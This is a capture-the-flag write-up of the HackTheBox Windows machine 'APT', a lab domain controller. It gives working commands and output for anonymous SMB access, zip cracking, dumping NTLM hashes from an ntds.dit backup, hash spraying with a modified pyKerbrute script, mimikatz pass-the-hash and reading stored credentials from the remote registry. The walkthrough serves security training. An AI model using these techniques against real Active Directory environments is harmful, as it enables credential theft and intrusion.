---
title: HTB: APT
url: https://0xdf.gitlab.io/2021/04/10/htb-apt.html
date: 2021-04-10T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: hackthebox, htb-apt, ctf, nmap, ipv6, rpc, ioxidresolver, active-directory, domain-controller, crackmapexec, hashcat, secretsdump, ntds, kerbrute, wail2ban, pykerbrute, mimikatz, passthehash, powershell, remote-registry, powerview, reg-py, evil-winrm, history, lmcompatibilitylevel, net-ntlmv1, winpeas, seatbelt, amsi, defender, responder, roguepotato, ntlmrelayx, visual-studio, crack-sh, powershell-history, oscp-plus-v2, oscp-like-v2, oscp-plus-v3, osep-like
---

![APT](https://0xdfimages.gitlab.io/img/apt-cover.png)

APT was a clinic in finding little things to exploit in a Windows host. I’ll start with access to only RPC and HTTP, and the website has nothing interesting. I’ll use RPC to identify an IPv6 address, which when scanned, shows typical Windows DC ports. Over SMB, I’ll pull a zip containing files related to an Active Directory environment. After cracking the password, I’ll use these files to dump 2000 users / hashes. Kerbrute will identify one user that is common between the backup and the AD on APT. The hash for that user doesn’t work, and brute forcing using NTLM hashes gets me blocked using SMB, so I’ll modify pyKerbrute to test all the hashes from the backup with the user, finding one that works. With that hash, I can access the registry and find additional creds that provide WinRM access. With a shell, I’ll notice that the system still allows Net-NTLMv1, which is an insecure format. I’ll show two ways to get the Net-NTLMv1 challenge response, first an unintended path using Defender and Responder, and then the intended path using RoguePotato and a custom RPC server created by modifying NTLMRelayX.

## Box Info

| Name | [APT](https://hackthebox.com/machines/apt)  [APT](https://hackthebox.com/machines/apt) [Play on HackTheBox](https://hackthebox.com/machines/apt) |
| --- | --- |
| Release Date | [31 Oct 2020](https://twitter.com/hackthebox_eu/status/1321799249470935042) |
| Retire Date | 10 Apr 2021 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for APT |
| Radar Graph | Radar chart for APT |
| First Blood User | 2 days04:20:38[pottm pottm](https://app.hackthebox.com/users/141036) |
| First Blood Root | 7 days05:27:41[0xEA31 0xEA31](https://app.hackthebox.com/users/13340) |
| Creator | [cube0x0 cube0x0](https://app.hackthebox.com/users/9164) |

## Recon

### nmap

`nmap` found two open TCP ports, RPC (135) and HTTP (80):

```

oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.213
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 11:34 EDT
Nmap scan report for 10.10.10.213
Host is up (0.065s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc

Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
oxdf@parrot$ sudo nmap -p 80,135 -sCV -oA scans/nmap-tcpscripts 10.10.10.213
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 11:34 EDT
Nmap scan report for 10.10.10.213
Host is up (0.13s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds

```

Not much on the OS beyond Windows.

### Website - TCP 80

The site is for a hosting company:

[![image-20210402113626700](https://0xdfimages.gitlab.io/img/image-20210402113626700.png)](https://0xdfimages.gitlab.io/img/image-20210402113626700.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210402113626700.png)

I recognized this website from Endgame Hades, but the vulnerability in that site isn’t present on this one.

There’s a bunch of static content, and a contact support form:

![image-20210402113805414](https://0xdfimages.gitlab.io/img/image-20210402113805414.png)

The form tries to submit to 10.13.38.16, which is also a part of Hades:

```

<div class="contact-form">
    <form method="post" action="https://10.13.38.16/contact-post.html">
        <input type="text" class="textbox" value="Name" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Name';}">
        <input type="text" class="textbox" value="Email" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Email';}">
        <textarea value="Message:" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Message';}">Message</textarea>
        <input type="submit" value="Submit">
    </form>

```

I’m guessing this is just reused, and also not useful. At the very bottom of the page, there’s a comment:

```

<!-- Mirrored from 10.13.38.16/support.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 23 Dec 2019 08:13:45 GMT -->

```

Definitely mirrored from Hades.

I didn’t find much else useful on the website, and given that it appears to just be copied from Endgame, I suspect I should look elsewhere. I did run [Feroxbuster](https://github.com/epi052/feroxbuster) to brute force directories, but didn’t find anything useful.

### RPC - TCP 135

This box gets into a level of detail that is quite a stretch for me, so I’m going to do my best to explain it, but also might handwave a bit more than usual. It’s easy to confuse the services offered over 135, 139, and 445 on Windows. [This Technet Article](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements) gives a good, long, and very detailed description of the different services and the different ports they use.

`rpcclient` will try to connect to TCP 445 or TCP 139, so it doesn’t do much here.

TCP 135 is the Endpoint Mapper and Component Object Model (COM) Service Control Manager. There’s a tool called `rpcmap.py` from [Impacket](https://github.com/SecureAuthCorp/impacket/) that will show these mappings. This tool needs a `stringbinding` argument to enable it’s connection. The examples from `-h` are:

> stringbinding String binding to connect to MSRPC interface, for example:
> ncacn\_ip\_tcp:192.168.0.1[135]   
> ncacn\_np:192.168.0.1[\pipe\spoolss]   
> ncacn\_http:192.168.0.1[593]   
> ncacn\_http:[6001,RpcProxy=exchange.contoso.com:443]   
> ncacn\_http:localhost[3388,RpcProxy=rds.contoso:443]

`NCANCN_IP_TCP` is an [RPC connection directly over TCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/95fbfb56-d67a-47df-900c-e263d6031f22). That seems like a good place to start. Running that gives a list of RPC mappings:

```

oxdf@parrot$ rpcmap.py 'ncacn_ip_tcp:10.10.10.213'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
...[snip]...
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
...[snip]...

```

This scan provided a bunch of RPC endpoints with their UUIDs. The MS-DCOM ones are defined on [this page](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4). The one shown above is the RPC interface UUID for IObjectExporter, or the IOXIDResolver. This is know that is used for the [Potato exploits](https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf). [This article](https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/) shows how to use this interface to get a list of network interfaces without auth.

There’s a POC script at the bottom (I added `()` around the print statement so it would work with modern Python), which I’ll grab and run:

```

oxdf@parrot$ python3 IOXIDResolver.py -t 10.10.10.213
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::9514:421b:5cde:a7da

```

### nmap on v6

With the IPv6 address, I’ll try `nmap` again, and there’s a bunch more open ports:

```

oxdf@parrot$ nmap -6 -p- --min-rate 10000 -oA scans/nmap-alltcp-ipv6 dead:beef::b885:d62a:d679:573f
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 12:44 EDT
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.032s latency).
Not shown: 65513 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49691/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 36.32 seconds

oxdf@parrot$ nmap -6 -p 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 -sCV -oA scans/nmap-tcpscripts-ipv6 dead:beef::b885:d62a:d679:573f
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 12:46 EDT
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.025s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-02 16:49:09Z)
135/tcp  open  msrpc        Microsoft Windows RPC
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5m50s, deviation: 22m38s, median: 2m42s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2021-04-02T17:49:53+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-02T16:49:49
|_  start_date: 2021-04-02T15:21:15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.64 seconds

```

That’s a bunch more information. All the open ports make it look like a Windows DC. The OS is Windows Server 2016 Standard 14393.

### SMB - TCP 445

IPv6 support was added to [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) in version 5.1.6dev. Still in trying to use it, there is a bug when trying to list shares. I reached out to one of the devs who got it fixed:

```

oxdf@parrot$ ~/cme smb dead:beef::b885:d62a:d679:573f --shares -u '' -p ''
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\: STATUS_ACCESS_DENIED 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] Enumerated shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            
SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share

```

If you can’t get the latest version, `smbclient` also shows the shares:

```

oxdf@parrot$ echo exit | smbclient -L \\\\dead:beef::b885:d62a:d679:573f
Enter WORKGROUP\oxdf's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available

```

There’s a share called `backup`. It contains a single file, `backup.zip`:

```

oxdf@parrot$ smbclient \\\\dead:beef::b885:d62a:d679:573f\\backup
Enter WORKGROUP\oxdf's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 03:30:52 2020
  ..                                  D        0  Thu Sep 24 03:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020

                10357247 blocks of size 4096. 6949719 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (6448.4 KiloBytes/sec) (average 6448.4 KiloBytes/sec)

```

## Shell as henry.vinson\_adm

### Recover ntds.dit

#### Enumeration

`backup.zip` looks like the backup of an Active Directory environment. The files are the ones needed to restore an AD environment, or to maliciously dump all the hashes offline:

```

oxdf@parrot$ unzip -l backup.zip 
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-09-23 19:40   Active Directory/
 50331648  2020-09-23 19:38   Active Directory/ntds.dit
    16384  2020-09-23 19:38   Active Directory/ntds.jfm
        0  2020-09-23 19:40   registry/
   262144  2020-09-23 19:22   registry/SECURITY
 12582912  2020-09-23 19:22   registry/SYSTEM
---------                     -------
 63193088                     6 files

```

On trying to unzip, it asks for a password:

```

oxdf@parrot$ unzip backup.zip 
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 

```

#### Generate/Crack Hash

`zip2john` will provide a hash for the password of the zip:

```

oxdf@parrot$ zip2john backup.zip > backup.zip.hash
backup.zip/Active Directory/ is not encrypted!
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
oxdf@parrot$ cat backup.zip.hash 
backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip

```

That hash matches “PKZIP (Compressed Multi-File)”, or more 17220, on the Hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page. It breaks in `hashcat` very quickly:

```

oxdf@parrot$ hashcat -m 17220 backup.zip.hash /usr/share/wordlists/rockyou.txt --user
...[snip]..
$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$:iloveyousomuch
...[snip]...

```

The password “iloveyousomuch” will decompress the archive.

### Dump Hashes

`secretsdump.py` will take the System hive and the `ntds.dit` file and dump that hashes. There are a ton of them.

I’ll save it to a file, and `grep` to get just the hashes, and there are 2000:

```

oxdf@parrot$ secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump
oxdf@parrot$ grep ':::' backup_ad_dump | wc -l
2000

```

I tried taking the admin hash and logging in with `crackmapexec` and `psexc.py`, and both returned invalid credentials:

```

oxdf@parrot$ crackmapexec smb dead:beef::b885:d62a:d679:573f -H 2b576acbe6bcfda7294d6bd18041b8fe -u administrator
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 

```

### Check Users

With 2000 users, I need a way to check how much of this is valid. Because Kerberos is available on IPv6 (TCP 88), I can use [Kerbrute](https://github.com/ropnop/kerbrute) to check the users. I’ll get a list of just the users:

```

oxdf@parrot$ grep ':::' backup_ad_dump | awk -F: '{print $1'} > users

```

Getting `kerbrute` to connect to an IPv6 was a bit tricky. Just putting the address in as the DC didn’t work. Eventually I got it working using the `hosts` file to define the IPv6 as apt.htb. My hosts file will show both `apt.htb` and `htb.local` as this IPv6:

```

dead:beef::b885:d62a:d679:573f apt.htb htb.local

```

Then `kerbrute` worked:

```

oxdf@parrot$ kerbrute userenum -d apt.htb --dc apt.htb users 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/02/21 - Ronnie Flathers @ropnop

2021/04/02 13:54:46 >  Using KDC(s):
2021/04/02 13:54:46 >   apt.htb:88

2021/04/02 13:54:51 >  [+] VALID USERNAME:       APT$@htb.local
2021/04/02 13:54:52 >  [+] VALID USERNAME:       Administrator@htb.local
2021/04/02 13:58:39 >  [+] VALID USERNAME:       henry.vinson@htb.local
2021/04/02 14:11:40 >  Done! Tested 2000 usernames (3 valid) in 1013.766 seconds

```

It took a while, and found that almost none of the users from the AD backup are in the current domain on APT. There’s really only one user, so that seems like a good place to look.

### Brute Hashes

#### Hash Fails

Given that henry.vinson has an account in both AD environments, perhaps I can auth as that account using the hash from the backup. Unfortunately, the hash doesn’t work:

```

oxdf@parrot$ ~/cme smb apt.htb -u henry.vinson -H 2de80758521541d19cabba480b260e8f
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE 

```

The creds are no good.

#### SMB Brute Failure

This step is supposed to be an attack on password reuse, so I’ll take all the hashes from the AD dump and try them with the one user I have, henry.vinson.

I’ll isolate the hashes into a file.

```

oxdf@parrot$ cat backup_ad_dump | grep ::: | cut -d: -f 3-4 > hashes

```

I first tried this over SMB with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec):

```

oxdf@parrot$ crackmapexec smb htb.local -u henry.vinson -H hashes
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE 
...[snip]...

```

After about 60 hashes, the box stops responding entirely. It turns out it has [wail2ban](https://github.com/glasnt/wail2ban) installed, preventing this kind of bruteforce. I had to reset the box to get it back.

#### Kerberos Brute

`kerbrute` doesn’t work with hashes (it relies on Go libraries that don’t expose the hash as a valid credential). I could update it to take a list of hashes, but that would be a ton of work. On the other hand, [pyKerbrute](https://github.com/3gstudent/pyKerbrute) is really close to what I want to do. It will take a list of users and a single hash and check them all over Kerberos. I’ll use that as a shell, and just re-write the main script.

Looking at the main function for this script, it uses the command line args to fill in variables, and then calls:

```

for line in file_object:
    passwordspray_tcp(user_realm, line.strip('\r\n'), user_key, kdc_a, sys.argv[5])

```

In this case, `line` is looping over the usernames. Looking where `passwordspray_tcp` is defined, I can get the variable names to get a better idea of the arguments:

```

def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):

```

I’ll write my own main that loops over hashes, calling `passwordspray_tcp` with the same username and different hashes, and let that function handle the check and printing of success. My main bit looks like:

```

if __name__ == '__main__':

    if len(sys.argv)!=5:
        print('Use Kerberos pre-authentication to test a single username with a list of password hashes.')                                                    
        print('Reference:')
        print('  https://github.com/ropnop/kerbrute')
        print('  https://github.com/mubix/pykek')
        print('  https://github.com/3gstudent/pyKerbrute')
        print('Author: 0xdf')
        print('Usage:')
        print(' %s <domainControlerAddr> <domainName> <username> <hash file>'%(sys.argv[0]))
        print(' %s 192.168.1.1 test.com administrator hashes.txt'%(sys.argv[0]))
        sys.exit(0)

    kdc_a = sys.argv[1]     
    user_realm = sys.argv[2].upper()
    username = sys.argv[3]
    print('[*] DomainControlerAddr: %s'%(kdc_a))
    print('[*] DomainName:          %s'%(user_realm))
    print('[*] Username:            %s'%(username))

    print('[*] Using TCP to test a single username with list of hashes.')
    with open(sys.argv[4], 'r') as f:
        hashes = list(map(str.strip, f.readlines()))

    for h in hashes:
        user_key = (RC4_HMAC, h.decode('hex'))
        passwordspray_tcp(user_realm, username, user_key, kdc_a, h)  

```

I’ll need to run this out of the same directory as it locally imports some crypto stuff, and I’ll use legacy Python, as those libraries choke otherwise. It finds a hash that works:

```

oxdf@parrot$ python2 kerbBruteHash.py apt.htb htb.local henry.vinson ~/hackthebox/apt-10.10.10.213/hashes-ntlm 
[*] DomainControlerAddr: apt.htb
[*] DomainName:          HTB.LOCAL
[*] Username:            henry.vinson
[*] Using TCP to test a single username with list of hashes.
[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb

```

### Remote Access

#### From Windows

henry.vinson doesn’t have permissions to do WinRM and isn’t admin (so no `psexec`). Still, there are things that you can do with credentials for an unprivileged user. If I had a plaintext password, I could open a `cmd` windows using `runas` and the `/netonly` flag. This stores the given credentials in my local system memory as if I’m that remote user, and when I try to run something interacting with the remote domain, the credentials are validated at that DC. This terminal could be used to run commands that run on remote computers.

Windows doesn’t provide an interface to do that authentication with a hash, but [Mimikatz](https://github.com/gentilkiwi/mimikatz) does. In my Windows VM, I’ll run `mimikatz.exe` as administrator. I’ll need to enable debug privileges:

```

mimikatz # privilege::debug
Privilege '20' OK

```

Now I can use the `sekurlsa::pth` command to start a CMD window with the creds for htb.local/henry.vinson:

```

mimikatz # sekurlsa::pth /user:henry.vinson /domain:htb.local /dc:htb.local /ntlm:e53d87d42adaa3ca32bdb34a876cbffb /command:powershell
user    : henry.vinson
domain  : htb.local
program : cmd.exe
impers. : no
NTLM    : e53d87d42adaa3ca32bdb34a876cbffb
  |  PID  8512
  |  TID  1072
  |  LSA Process was already R/W
  |  LUID 0 ; 26311359 (00000000:01917abf)
  \_ msv1_0   - data copy @ 000002268D405640 : OK !
  \_ kerberos - data copy @ 000002268D6F4D08
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000002268C873828 (32) -> null

```

This pops a new `cmd.exe` windows on my VM that has creds for henry.vinson cached.

There wasn’t a ton I could do as henry.vinson, but I was able to [remote access the registry](https://itfordummies.net/2016/09/06/read-remote-registry-powershell/), but only the HKCU hive:

```

PS > $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'htb.local')
PS > $key = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
Exception calling "OpenSubKey" with "1" argument(s): "Requested registry access is not allowed."
At line:1 char:1
+ $key = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : SecurityException

PS > $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', 'htb.local')
PS > $key = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run')

```

In the output above I went for a key I know well from malware persistence, and there was nothing there, but it shows that I can access HKCU. That works because henry.vinson is currently logged onto APT, as shown by `Get-NetSession` from [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon):

```

PS > Get-NetSession -ComputerName htb.local

sesi10_cname     : \\[dead:beef:2::1007]
sesi10_username  : henry.vinson
sesi10_time      : 153
sesi10_idle_time : 0
ComputerName     : htb.local

```

Looking around HKCU, there’s an interesting bit of software that jumped out, `GiganticHostingManagementSystem`:

```

PS > $reg.OpenSubKey('SOFTWARE').getSubkeyNames()
GiganticHostingManagementSystem
Microsoft
Policies
RegisteredApplications
VMware, Inc.
Wow6432Node
Classes

```

This key has two values, which look to be creds for henry.vinson\_adm:

```

PS > $reg.OpenSubKey('SOFTWARE\GiganticHostingManagementSystem').getValueNames()
UserName
PassWord
PS > $reg.OpenSubKey('SOFTWARE\GiganticHostingManagementSystem').GetValue('UserName')
henry.vinson_adm
PS > $reg.OpenSubKey('SOFTWARE\GiganticHostingManagementSystem').GetValue('Password')
G1#Ny5@2dvht

```

#### From Linux

Impacket has a script, `reg.py`, which will do remote reg reads and can take a hash as auth. It took a minute to get the syntax right, and looking at the help to notice that the Current User hive is referred to as `HKU` and not `HKCU`, but it works:

```

